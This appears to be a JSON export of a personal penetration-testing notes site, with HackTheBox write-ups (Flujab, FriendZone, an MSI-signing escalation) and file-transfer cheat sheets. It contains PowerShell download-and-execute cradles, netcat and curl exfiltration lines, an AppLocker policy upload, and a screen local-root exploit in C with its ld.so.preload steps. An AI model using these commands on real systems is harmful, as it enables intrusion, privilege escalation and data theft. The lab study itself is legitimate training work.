myspc.cer  \u0026quot;C:\\Program Files (x86)\\Windows kits\\10\\bin\\10.0.17763.0\\x64\\pvk2pfx.exe\u0026quot; -pvk myspc.pvk -spc myspc.cer -pfx myspc.pfx  \u0026quot;C:\\Program Files (x86)\\Windows kits\\10\\bin\\10.0.17763.0\\x64\\signtool.exe\u0026quot; sign /v /f myspc.pfx test.msi  verifying is VERY IMPORTANT. because like i figured out you wont know whats going on i was able to use this to figure out some problems i had locally.\n\u0026quot;C:\\Program Files (x86)\\Windows kits\\10\\bin\\10.0.17763.0\\x64\\signtool.exe\u0026quot; verify /pa \\Users test.msi  INSTALL CERT\nright click on myca.cer\nselect user\nselect certificates go to browse then select trusted root.\nI would like to note if you don\u0026rsquo;t do this first you may get this error.\nOnce the CA is added, still might see a error but it verifies the root authority.\nSetup the netcat listener make sure to kill the listener you are using. I liked using the nc listener will tell you when the upload is finished by exiting out which was really nice.\nncat --ssl --send-only --ssl-key key.pem --ssl-cert cert.pem -lvp 136 \u0026lt; test.msi c:\\progra~2\\openssl-v1.1.0\\bin\\openssl.exe s_client -quiet -connect 10.10.14.2:136 \u0026gt; c:\\users\\public\\desktop\\shortcuts\\test.msi  Then login as jorge this is nessiary to move the files around to the correct location. once you copy the file over but sure to close everything out and restart the openssl listeners. this is on a five minute cycle try and do everything towards the 3 min mark so none of the listener close out.\ndir d:\\dev\\msis copy /y c:\\users\\public\\desktop\\shortcuts\\test.msi d:\\dev\\msis  LOOT\nthe script that ran to get root\n:loop echo opening MSIs PING localhost -n 300 \u0026gt;NUL dir /B \u0026quot;D:\\DEV\\MSIs\\*.msi\u0026quot; \u0026gt; \u0026quot;C:\\Users\\rupal\\Documents\\files.txt\u0026quot; for /F \u0026quot;tokens=*\u0026quot; %%A in (files.txt) do move \u0026quot;D:\\DEV\\MSIs\\%%A\u0026quot; \u0026quot;C:\\Users\\rupal\\Documents\\MSI Testing\u0026quot; \u0026amp;\u0026amp; START \u0026quot;\u0026quot; \u0026quot;C:\\Windows\\System32\\msiexec.exe\u0026quot; /i \u0026quot;C:\\Users\\rupal\\Documents\\MSI Testing\\%%A\u0026quot; /norestart \u0026amp;\u0026amp; PING localhost -n 15 \u0026gt;NUL \u0026amp;\u0026amp; taskkill /F /IM msiexec.exe \u0026amp;\u0026amp; del /F \u0026quot;C:\\Users\\rupal\\Documents\\MSI Testing\\%%A\u0026quot; del /F \u0026quot;C:\\Users\\rupal\\Documents\\files.txt\u0026quot; cls GOTO loop  the script to get user.txt\n@echo off :loop echo opening program PING localhost -n 5 \u0026gt;NUL START /MIN \u0026quot;\u0026quot; cmd /c \u0026quot;C:\\Users\\Public\\Desktop\\Shortcuts\\Visual Studio 2017.lnk\u0026quot; \u0026amp;\u0026amp; PING localhost -n 5 \u0026gt;NUL \u0026amp;\u0026amp; copy /Y \u0026quot;C:\\Users\\jorge\\Documents\\Visual Studio 2017.lnk\u0026quot; \u0026quot;C:\\Users\\Public\\Desktop\\Shortcuts\\Visual Studio 2017.lnk\u0026quot; \u0026amp;\u0026amp; PING localhost -n 50 \u0026gt;NUL \u0026amp;\u0026amp; taskkill /F /IM devenv.exe cls GOTO loop  "
},
{
	"uri": "/linux/ftp/",
	"title": "FTP",
	"tags": [],
	"description": "",
	"content": "File transfer protocol is a terrible service and you should never run it without some kind of protection in front of it. I\u0026rsquo;ve bumped into quite a few boxes running FTP. I often forget all the commands you can run with ftp.\nhttps://slacksite.com/other/ftp.html\nmget * download everything in the directory get download file / documents put upload file / documents nmap (maybe even in intereactive mode)  SSHFS \u0026amp; SFTP\nSSHFS is built on SFTP. SFTP use’s the SSH protocol for added security to FTP. SSHFS allows you to mount to the file system. This gives you more options when interacting with the host. If SSH is available on the host you can use SFTP or SSHFS.\napt-get install sshfs -y sshfs -p 2222 user@ip_address: /mnt/nightmare/ find . -ls 2\u0026gt;/dev/null \u0026gt; ~/out/put/directory.txt \u0026lt;-- takes forever grep file.txt ~/out/put/directory.txt  decided to play around with ftp and find some new ways to interact with it.\nwget --no-passive-ftp -m ftp://anonymous@10.10.10.106/filepath/filename you may also just leave it at the ip address to download the whole directory. -m mirror -c continue download --no-passive-ftp man wget | grep passive-ftp  powershell - this is rather limited you may only download one file at a time. Have the ability to use scripts.\nhttps://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp\n iwr(Invoke-WebRequest -Uri ftp://10.10.10.106/CHIPSET.txt -OutFile $pwd\\CHIPSET.txt -Credential \u0026quot;anonymous\u0026quot;)  for the below you dont need the parameters they maybe subbed into the one liner. Note it uses downloadfile instead of typically string. string will print it out into powershell, file just downloads neat.\nhttps://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n$url = \u0026quot;ftp://10.10.10.106/CHIPSET.txt\u0026quot; $output = \u0026quot;$pwd\\ftp\\chipset.txt\u0026quot; powershell (new-object system.net.webclient).downloadfile($url, $output)  scripts all da files = i have not test this.\n#ftp server $ftp = \u0026quot;ftp://example.com/\u0026quot; $user = \u0026quot;XX\u0026quot; $pass = \u0026quot;XXX\u0026quot; $SetType = \u0026quot;bin\u0026quot; $remotePickupDir = Get-ChildItem 'c:\\test' -recurse $webclient = New-Object System.Net.WebClient $webclient.Credentials = New-Object System.Net.NetworkCredential($user,$pass) foreach($item in $remotePickupDir){ $uri = New-Object System.Uri($ftp+$item.Name) #$webclient.UploadFile($uri,$item.FullName) $webclient.DownloadFile($uri,$item.FullName) }  "
},
{
	"uri": "/concepts/file-transfer/",
	"title": "File Transfer",
	"tags": [],
	"description": "",
	"content": "######## LI/NUX #########\nPython http server\npython3 -m http.server 9090 python -m simpleHTTPServer 9090  Curl\nupload = curl -F 'data=@home/Documents' IP_ADDRESS download = curl http://IP_ADDRESS -o file  wget\nupload = wget --post-file user.txt http://IP_ADDRESS:PORT download = wget http://address:9090/filename  NetCat File Transfer\nNetcat notice with this method , sender \u0026lt;, reciever \u0026gt;. -w wait, -l listener -p port\nupload = nc -w 3 [your_ip] 1337 \u0026lt; file.txt listener = nc -lp 1337 \u0026gt; file.txt  if you\u0026rsquo;d like to compress and decompress sending a whole image with the dd comand, lol. wow https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/\n#####################Window############## Download ​``` # Python http server ​``` listener = python3 -m http.server 9090 listener = python -m SimpleHTTPServer 9090 Invoke = IEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS/file-needed') Invoke-Web-Request = powershell IWR \u0026quot;http://10.10.14.49/nc.exe\u0026quot; -OutFile nc.exe ############################################ Upload using SMB to share files i would like to note that that impacket might hang and since its written in python. ps -ef|grep python. #target machine net use z: \\\\IP_ADDRESS\\share ​``` # kali machine ​``` impacket-smbserver share `pwd` | ` not ' #target machine copy file_name z: ###################### note if you have issues try this method ###################################### #target machine net use z: \\\\IP_ADDRESS\\share ​``` # kali machine impacket-smbserver share `pwd` | ` not ' #target machine cd z: mkdir tmp cd tmp IEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS/file-needed') ############################################ Reel Method from hackthebox kind of difficult to setup. Hopefully, I saved you all the pain it caused me. download = IEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS/FILE') Using nginx to transfer files. watched a video by ippsec, you should subscribe. Anyways seems like a neat trick to keep handy. Also, back up nginx before you mess with it. Back it up, anything for the love of God. mkdir /var/www/upload cd /etc/nginx/sites-available cat default|grep -v '\\#'|grep . \u0026gt; file_upload vi file_upload server { listen [CHANGE ME PORT] default_server; server_name chicken.pwny; location / { root /var/www/upload; dav_methods PUT; } } cd /etc/ ln -s /etc/nginx/sites-available/file_upload /etc/nginx/sites-enabled/ chmod 644 /var/www/html chown www-data /var/www/upload/ service nginx start #### this method assigns the applockerpolcy to a variable and the invoke-restmethod will call the variable. $output = Get-ApplockerPolicy -Effective -xml Invoke-RestMethod -Method PUT -Uri \u0026quot;http://IP_ADDRESS:PORT/file.txt\u0026quot; -Body $output ####  "
},
{
	"uri": "/filetransfer/",
	"title": "File Transfer",
	"tags": [],
	"description": "",
	"content": "##################Linux########################## 1# Python http server listener = python3 -m http.server 9090 listener = python -m simpleHTTPServer 9090 upload = curl -F 'data=@home/Documents' IP_ADDRESS download = curl http://IP_ADDRESS -o file Note for wget post method youll need to use netcat instead of python doesn't support post. upload = wget --post-file user.txt http://IP_ADDRESS:PORT download = wget http://address:9090/filename 2# Netcat notice with this method , sender \u0026lt;, reciever \u0026gt;. -w wait, -l listener -p port upload = nc -w 3 [your_ip] 1337 \u0026lt; file.txt listener = nc -lp 1337 \u0026gt; file.txt if you'd like to compress and decompress sending a whole image with the dd comand, lol. wow https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/  #####################Window############## Download ​``` # Python http server ​``` listener = python3 -m http.server 9090 listener = python -m SimpleHTTPServer 9090 Invoke = IEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS/file-needed') Invoke-Web-Request = powershell IWR \u0026quot;http://10.10.14.49/nc.exe\u0026quot; -OutFile nc.exe ############################################ Upload using SMB to share files i would like to note that that impacket might hang and since its written in python. ps -ef|grep python. #target machine net use z: \\\\IP_ADDRESS\\share ​``` # kali machine ​``` impacket-smbserver share `pwd` | ` not ' #target machine copy file_name z: ###################### note if you have issues try this method ###################################### #target machine net use z: \\\\IP_ADDRESS\\share ​``` # kali machine impacket-smbserver share `pwd` | ` not ' #target machine cd z: mkdir tmp cd tmp IEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS/file-needed') ############################################ Reel Method from hackthebox kind of difficult to setup. Hopefully, I saved you all the pain it caused me. download = IEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS/FILE') Using nginx to transfer files. watched a video by ippsec, you should subscribe. Anyways seems like a neat trick to keep handy. Also, back up nginx before you mess with it. Back it up, anything for the love of God. mkdir /var/www/upload cd /etc/nginx/sites-available cat default|grep -v '\\#'|grep . \u0026gt; file_upload vi file_upload server { listen [CHANGE ME PORT] default_server; server_name chicken.pwny; location / { root /var/www/upload; dav_methods PUT; } } cd /etc/ ln -s /etc/nginx/sites-available/file_upload /etc/nginx/sites-enabled/ chmod 644 /var/www/html chown www-data /var/www/upload/ service nginx start #### this method assigns the applockerpolcy to a variable and the invoke-restmethod will call the variable. $output = Get-ApplockerPolicy -Effective -xml Invoke-RestMethod -Method PUT -Uri \u0026quot;http://IP_ADDRESS:PORT/file.txt\u0026quot; -Body $output ####  "
},
{
	"uri": "/linux/filetransfer/",
	"title": "File Transfer",
	"tags": [],
	"description": "",
	"content": "There\u0026rsquo;s more than one way to skin a cat. This guide will cover way\u0026rsquo;s, to move files off of a Linux environment. This guide will cover tools you can find natively on most Linux environments, you may also move over binaries of the tool you wish to use to move the file off.\nNOTICE : KEY WHEN IT SAYS DOWNLOAD USER PYTHON HTTP SERVER, WHEN IT SAY UPLOAD US NETCAT EXAMPLES BELOW.\n**Python \u0026ldquo;Simple Http Server\u0026rdquo; can be run in version 2 and below as well in 3 and up. **\npython -m Simple.HTTP.Server 80 python3 -m http.serer 80 nc -vlp 80 \u0026gt; ./wherever/whatever.txt  WGET Native To the Linux Region\n##Download wget http://address:port/filename.txt \u0026gt;whatever.txt ##Upload wget --post-file whatever.txt http://ip_address:port  CURL Native To the Linux Region\n#Download curl http://IP_ADDRESS:PORT -o file #Upload curl -F 'data=@home/Documents' IP_ADDRESS:PORT  NETCAT Native To the Linux Region\nNetcat notice with this method , sender \u0026lt;, reciever \u0026gt;. -w wait, -l listener -p port\nif you\u0026rsquo;d like to compress and decompress sending a whole image with the dd comand, lol. wow https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/\nupload nc -w 3 [your_ip] 1337 \u0026lt; file.txt listener nc -lp 1337 \u0026gt; file.txt  "
},
{
	"uri": "/windows/filetransfer/",
	"title": "File Transfer",
	"tags": [],
	"description": "",
	"content": "UNDERDEVELOPMENT GONNA GO DO SOME CTF LOL  #####################Window############## Download ​``` # Python http server ​``` listener = python3 -m http.server 9090 listener = python -m SimpleHTTPServer 9090 Invoke = IEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS/file-needed') Invoke-Web-Request = powershell IWR \u0026quot;http://10.10.14.49/nc.exe\u0026quot; -OutFile nc.exe ############################################ Upload using SMB to share files i would like to note that that impacket might hang and since its written in python. ps -ef|grep python. #target machine net use z: \\\\IP_ADDRESS\\share ​``` # kali machine ​``` impacket-smbserver share `pwd` | ` not ' #target machine copy file_name z: ###################### note if you have issues try this method ###################################### #target machine net use z: \\\\IP_ADDRESS\\share ​``` # kali machine impacket-smbserver share `pwd` | ` not ' #target machine cd z: mkdir tmp cd tmp IEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS/file-needed') ############################################ Reel Method from hackthebox kind of difficult to setup. Hopefully, I saved you all the pain it caused me. download = IEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS/FILE') Using nginx to transfer files. watched a video by ippsec, you should subscribe. Anyways seems like a neat trick to keep handy. Also, back up nginx before you mess with it. Back it up, anything for the love of God. mkdir /var/www/upload cd /etc/nginx/sites-available cat default|grep -v '\\#'|grep . \u0026gt; file_upload vi file_upload server { listen [CHANGE ME PORT] default_server; server_name chicken.pwny; location / { root /var/www/upload; dav_methods PUT; } } cd /etc/ ln -s /etc/nginx/sites-available/file_upload /etc/nginx/sites-enabled/ chmod 644 /var/www/html chown www-data /var/www/upload/ service nginx start #### this method assigns the applockerpolcy to a variable and the invoke-restmethod will call the variable. $output = Get-ApplockerPolicy -Effective -xml Invoke-RestMethod -Method PUT -Uri \u0026quot;http://IP_ADDRESS:PORT/file.txt\u0026quot; -Body $output ####  "
},
{
	"uri": "/hackthebox/boxes/flujab/",
	"title": "Flujab",
	"tags": [],
	"description": "",
	"content": "Thank you to 0xdf and ippsec for their guides. Postmortem\nThis will not be the typical guide. I will be covering highlights.\nChangeing /etc/hosts didn\u0026rsquo;t notice any change then i went to 0xdf notes. saw that openssl was used to get a list of of fqdmn. I thought it would be neat to use the same trick use din sizzle to get the certs. exporting the cert didn\u0026rsquo;t not yield the (field values). 0xdf covered smtp.flujab.htb \u0026amp; freeflyjab.htb. in the process used wfuzz to enumerate domains. I found that interesting so that will be covered. in the next phase scripting union injection in python.\nsmtp.flujab.htb freeflujab.htb  Not Critical DNS Name: clownware.htb DNS Name: sni147831.clownware.htb DNS Name: *.clownware.htb DNS Name: proxy.clownware.htb DNS Name: console.flujab.htb DNS Name: sys.flujab.htb DNS Name: smtp.flujab.htb DNS Name: vaccine4flu.htb DNS Name: bestmedsupply.htb DNS Name: custoomercare.megabank.htb DNS Name: flowerzrus.htb DNS Name: chocolateriver.htb DNS Name: meetspinz.htb DNS Name: rubberlove.htb DNS Name: freeflujab.htb DNS Name: flujab.htb  1)2)0xdf = used some commands to clean up the output. grep DNS\necho | openssl s_client -showcerts -servername 10.10.10.124 -connect 10.10.10.124:443 2\u0026gt;/dev/null | openssl x509 -inform pem -noout -text | grep DNS | tr \u0026quot;,\u0026quot; \u0026quot;\\n\u0026quot; | cut -d: -f2  WFUZZ\nwfuzz -w /seclists/domains -c -u https://FUZZ  wfuzz -w domains -c -u https://FUZZ:8080  FREEFLUJAB.HTB\nSo, skipping allot here just to get to ?book , send the web request to burp. XD i didn\u0026rsquo;t see most of this initially. while reading 0xdf notes i couldn\u0026rsquo;t quite understand where the modus cookie was. i support in the future set-cookie, ill remember set-cookie\u0026rsquo;s are in the response not the request. but i figured the cookies might have showed up in the browser but i couldn\u0026rsquo;t find them there.\nAt the end of the modus cookie path parameter is set to /?smtp_config\nSet-Cookie: Modus=Q29uZmlndXJlPU51bGw%3D; expires=Mon, 17-Jun-2019 10:18:08 GMT; Max-Age=3600; path=/?smtp_config Set-Cookie: Registered=M2Y0YzdhMmExMjljMjliZTFjMjQyZmRkZDVmOTVjYWI9TnVsbA%3D%3D; expires=Mon, 17-Jun-2019 10:18:08 GMT; Max-Age=3600; path=/  echo -n 10.10.14.2 | md5sum 3f4c7a2a129c29be1c242fddd5f95cab  Modus cookie\nModus=Q29uZmlndXJlPU51bGw%3D; expires=Mon, 17-Jun-2019 10:18:08 GMT; Max-Age=3600; path=/?smtp_config  There are two highlights previously mentioned you may move the string to a file and use base64 -d to decode or move it over to burp decoder. change the null value to True. Ippsec used burp intercept to change the coookie, and 0xdf used burp replace.\nQ29uZmlndXJlPU51bGw%3D  This is how 0xdf changed the cookie (i believe this is more perment than what ippsec did but im not sure.)\nOn smtp_config page go to firefoxs inspect elements the go to storage it should show all the cookies. Here you may change the cookie value from the null to true.\nThe next part we change mailserver parameter in ?smtp_config post request. This should allow us to establish a connection. Ippsec and 0xdf both did it differently. ippsec changed the parameter in the browser 0xdf changed the value in burp. Sometimes it\u0026rsquo;s easy to forget you can easily change theses values int he browser. instead of always using the burp.\nippsec highlighted the input field on smtp_config right clicked went to instpect elements deleted the patternn parameters. which removed the restrictions. You could also change the mailserver value\nRegistrated\nneed to change the registrated cookie which will reveal another webpage. repeat the steps for changing the modus cookie. If you have firefox\u0026rsquo;s cookie manager you may also change the cookie using that. pretty neat to see all the different ways to do this. This will give us access to the webpage where the sqli out of band is.\nSQL-INJECTION OUT OF BAND\nIn this phase we\u0026rsquo;ll be targeting ?cancel. ?smtp_config seemed to not lead anywhere. i would like to note i haven\u0026rsquo;t looked to far ahead so this is kind of as you go. You have to enter a vadlid request for this to work.\nChaning the cookies,\nmaking smtp.py server\nplaying around with sql commands\nscripting\nFirst off when making python script it is best tow rite out the objectives for each method and class. then build the framework. then fill it based on what i have witnessed. First 0xdf makes a sub module that overwites some fuctions to gain full functionality over the module.\npattern = re.compile(\u0026quot;Subject: Flu Jab Appointment - Ref:(.*)\\nMessage-ID\u0026quot;, re.DOTALL) class CustomSMTPServer(smtpd.SMTPServer): def process_message(self, peer, mailfrom, rcpttos, data, **kwargs): res = re.serach(pattern, data.decode('utf-8')).group(1)  CMD LOOP\ntammy\nlocate ssh2john\nssh-keygen -l -f key.pub\nssh-keygen -l -E md5 -f pinkie.pub |sed 's/://g'  bypassing restricted shell = 0xdf used a pretty cool script to get out i just used the -t switch. after you escape you have\n0xdf used this to find suid binaries. it\u0026rsquo;s filtering the output differently than what i normally use.\nfind / -user root -perm -4000 -exec ls -ldb {} \\; 2\u0026gt;/dev/null  So there are two version of screen running on the system 0cdf pointed out that the date on one of them matches the timestamp on user.txt. logically this should be the desired one. I had tried Since the system doesn\u0026rsquo;t have gcc or away to compile c code.\nThe below script compiles two exploits to get root write in c. taking those out and compiling them localling. then using python http server to transfer the over.\nhttps://github.com/XiphosResearch/exploits/blob/master/screen2root/screenroot.sh\nLIBHAX.C #### gcc -fPIC -shared -ldl -o libhax.c\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; __attribute__ ((__constructor__)) void dropshell(void){ chown(\u0026quot;/tmp/rootshell\u0026quot;, 0, 0); chmod(\u0026quot;/tmp/rootshell\u0026quot;, 04755); unlink(\u0026quot;/etc/ld.so.preload\u0026quot;); printf(\u0026quot;[+] done!\\n\u0026quot;); }  ROOTSHELL.C ##### gcc -fPIC -shared -ldl -o rootshell.c\n#include \u0026lt;stdio.h\u0026gt; int main(void){ setuid(0); setgid(0); seteuid(0); setegid(0); execvp(\u0026quot;/bin/sh\u0026quot;, NULL, NULL); }  Transfer - setup a simple http server using python. retrieve the compiled binaries. You may place the binaries in any directory but remember that it has to reflect whats written in the code above. you may run the screen command from any directory.\nwget http://10.10.14.165/rootshell wget http://10.10.14.165/libhax.so /usr/local/share/screen/screen -D -m -L ld.so.preload echo -ne \u0026quot;\\x0a/tmp/libhax.so\u0026quot; /usr/local/share/screen/screen -ls /tmp/rootshell BAM  BEYOND ROOT im really interested in how the machine was configured. It\u0026rsquo;s kind of funny at the level of complexity it took to enumerate the WebApp. The local dns fily was pretty simple.\n# cat /etc/hosts 127.0.0.1 localhost 127.0.0.1 flujab.htb flujab 127.0.0.1 smtp.flujab.htb 127.0.0.1 sysadmin-console-01.flujab.htb  How the web directory was laid out. /var/www/html. I think it\u0026rsquo;s pretty cool how complex these ctf can become.\n"
},
{
	"uri": "/hackthebox/boxes/friendzone/",
	"title": "FriendZone",
	"tags": [],
	"description": "",
	"content": " Not shown: 993 closed ports [326/1271] PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |_ 256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519) 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Friend Zone Escape software 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http Apache httpd 2.4.29 |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 404 Not Found | ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO | Not valid before: 2018-10-05T21:02:30 |_Not valid after: 2018-11-04T21:02:30 |_ssl-date: TLS randomness does not represent time | tls-alpn: 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: -45m03s, deviation: 1h09m16s, median: -5m04s |_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: friendzone | NetBIOS computer name: FRIENDZONE\\x00 | Domain name: \\x00 | FQDN: friendzone |_ System time: 2019-02-12T06:14:29+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-02-11 23:14:28 |_ start_date: N/A  137 139 NMAP-SMB USER SCAN\nEnumerates shares using MSRPC function, it will check common share names.\nsudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 10.10.10.123 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-12 13:41 EST Nmap scan report for friendzone.red (10.10.10.123) Host is up (0.040s latency). PORT STATE SERVICE 139/tcp open netbios-ssn 137/udp open netbios-ns Host script results: | smb-enum-shares: | account_used: guest | \\\\10.10.10.123\\Development: | Type: STYPE_DISKTREE | Comment: FriendZone Samba Server Files | Users: 0 | Max Users: \u0026lt;unlimited\u0026gt; | Path: C:\\etc\\Development | Anonymous access: READ/WRITE | Current user access: READ/WRITE | \\\\10.10.10.123\\Files: | Type: STYPE_DISKTREE | Comment: FriendZone Samba Server Files /etc/Files | Users: 0 | Max Users: \u0026lt;unlimited\u0026gt; | Path: C:\\etc\\hole | Anonymous access: \u0026lt;none\u0026gt; | Current user access: \u0026lt;none\u0026gt; | \\\\10.10.10.123\\IPC$: | Type: STYPE_IPC_HIDDEN | Comment: IPC Service (FriendZone server (Samba, Ubuntu)) | Users: 1 | Max Users: \u0026lt;unlimited\u0026gt; | Path: C:\\tmp | Anonymous access: READ/WRITE | Current user access: READ/WRITE | \\\\10.10.10.123\\general: | Type: STYPE_DISKTREE | Comment: FriendZone Samba Server Files | Users: 0 | Max Users: \u0026lt;unlimited\u0026gt; | Path: C:\\etc\\general | Anonymous access: READ/WRITE | Current user access: READ/WRITE | \\\\10.10.10.123\\print$: | Type: STYPE_DISKTREE | Comment: Printer Drivers | Users: 0 | Max Users: \u0026lt;unlimited\u0026gt; | Path: C:\\var\\lib\\samba\\printers | Anonymous access: \u0026lt;none\u0026gt; |_ Current user access: \u0026lt;none\u0026gt;  NMAP 445\nnmap --script smb-enum-shares.nse -p445 10.10.10.123 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-12 13:58 EST Nmap scan report for friendzone.red (10.10.10.123) Host is up (0.039s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb-enum-shares: | account_used: guest | \\\\10.10.10.123\\Development: | Type: STYPE_DISKTREE | Comment: FriendZone Samba Server Files | Users: 0 | Max Users: \u0026lt;unlimited\u0026gt; | Path: C:\\etc\\Development | Anonymous access: READ/WRITE | Current user access: READ/WRITE | \\\\10.10.10.123\\Files: | Type: STYPE_DISKTREE | Comment: FriendZone Samba Server Files /etc/Files | Users: 0 | Max Users: \u0026lt;unlimited\u0026gt; | Path: C:\\etc\\hole | Anonymous access: \u0026lt;none\u0026gt; | Current user access: \u0026lt;none\u0026gt; | \\\\10.10.10.123\\IPC$: | Type: STYPE_IPC_HIDDEN | Comment: IPC Service (FriendZone server (Samba, Ubuntu)) | Users: 1 | Max Users: \u0026lt;unlimited\u0026gt; | Path: C:\\tmp | Anonymous access: READ/WRITE | Current user access: READ/WRITE | \\\\10.10.10.123\\general: | Type: STYPE_DISKTREE | Comment: FriendZone Samba Server Files | Users: 0 | Max Users: \u0026lt;unlimited\u0026gt; | Path: C:\\etc\\general | Anonymous access: READ/WRITE | Current user access: READ/WRITE | \\\\10.10.10.123\\print$: | Type: STYPE_DISKTREE | Comment: Printer Drivers | Users: 0 | Max Users: \u0026lt;unlimited\u0026gt; | Path: C:\\var\\lib\\samba\\printers | Anonymous access: \u0026lt;none\u0026gt; |_ Current user access: \u0026lt;none\u0026gt;  https://nmap.org/nsedoc/scripts/smb-enum-shares.html\nThe image seems to hint towards heartbleed exploit. hmmm there are different stuff we can leak with heartbleed vuln smb ftp etc so this might be it.\nGOBUSTER\ngobuster -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -u http://friendzone.htb ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://friendzone.htb/ [+] Threads : 10 [+] Wordlist : /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 10s ===================================================== 2019/02/11 23:44:01 Starting gobuster ===================================================== /wordpress (Status: 301) ===================================================== 2019/02/11 23:50:02 Finished =====================================================  This is weird it would seem that possibly im suppose to upload rce somehow. wpscan reports wp is not up so perhaps a fakeout.\nNMAP-CLUE RED\nfriendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO  CYBERCHEF\ndecoding the string provided, it provided another string i checked it against crackstation nothing returned.\nCFykJCB1nC15499490527QasJWT7r7  SMBMAP\n-H 10.10.10.123 -u info@friendzoneportal.red -p CFykJCB1nC15499490527QasJWT7r7\nsmbmap -H 10.10.10.123 -u info@friendzoneportal.red -p CFykJCB1nC15499490527QasJWT7r7 -d WORKGROUP [+] Finding open SMB ports.... [+] Guest SMB session established on 10.10.10.123... [+] IP: 10.10.10.123:445 Name: friendzone.red Disk Permissions ---- ----------- print$ NO ACCESS Files NO ACCESS general READ ONLY Development READ, WRITE IPC$ NO ACCESS  SMBCLIENT\nsmblcient --U admin@friendzoneportal.red //10.10.10.123  SMB CREDS\ncreds for the admin THING:q admin:WORKWORKHhallelujah@# WORKWORKHhallelujah@#  smbmap -H 10.10.10.123 -u admin@friendzoneportal.red -p WORKWORKHhallelujah@# -d WORKGROUP  WFUZZ\ncommand injection trying to find osme lfi so i can run the php backdoor\nwfuzz -c -w /home/htb/wordlist/seclist/Discovery/Web-Content/burp-parameter-names.txt --hh 403 -u 'http://friendzone.red/js/js/FUZZ=cat+/etc/hosts' --hc 404  wfuzz -c -w /home/htb/wordlist/seclist/Fuzzing/LFI-JHADDIX.txt -u \u0026quot;http://frien dzone.red/js/jsFUZZ\u0026quot; --hc 404  WFUZZ SUBDOMAINS\nwfuzz -c -f sub-friendzone -w /home/htb/wordlist/seclist/Discovery/DNS/subdomains-top1mil-5000.txt -u \u0026quot;https://friendzone.red\u0026quot; -H \u0026quot;Host: FUZZ.friendzone.red\u0026quot; -t 42 --hc 404 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ******************************************************** * Wfuzz 2.3.3 - The Web Fuzzer * ******************************************************** Target: https://friendzone.red/ Total requests: 4996 ================================================================== ID Response Lines Word Chars Payload ================================================================== 000689: C=400 12 L 53 W 423 Ch \u0026quot;gc._msdcs\u0026quot; 001321: C=200 13 L 35 W 391 Ch \u0026quot;uploads\u0026quot;  000053: C=200 0 L 2 W 7 Ch \u0026quot;login\u0026quot; 002721: C=200 0 L 12 W 101 Ch \u0026quot;dashboard\u0026quot; 021086: C=200 0 L 5 W 36 Ch \u0026quot;timestamp\u0026quot;  go to etc/hosts and add in uploads.friendzone.red\nWFUZZ\nfuzzing dashboard i cound the load function or whatever command api.\nwfuzz -c -w /home/htb/wordlist/seclist/Discovery/Web-Content/burp-parameter-names.txt --hl 0 'https://administrator1.friendzone.red/dashboard.php?FUZZ=junk' Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ******************************************************** * Wfuzz 2.3.3 - The Web Fuzzer * ******************************************************** Target: https://administrator1.friendzone.red/dashboard.php?FUZZ=junk Total requests: 2588 ================================================================== ID Response Lines Word Chars Payload ================================================================== 000233: C=200 0 L 12 W 101 Ch \u0026quot;load\u0026quot;^C  DNS\ndig axfr @10.10.10.123 ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.11.5-P1-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr @10.10.10.123 ; (1 server found) ;; global options: +cmd 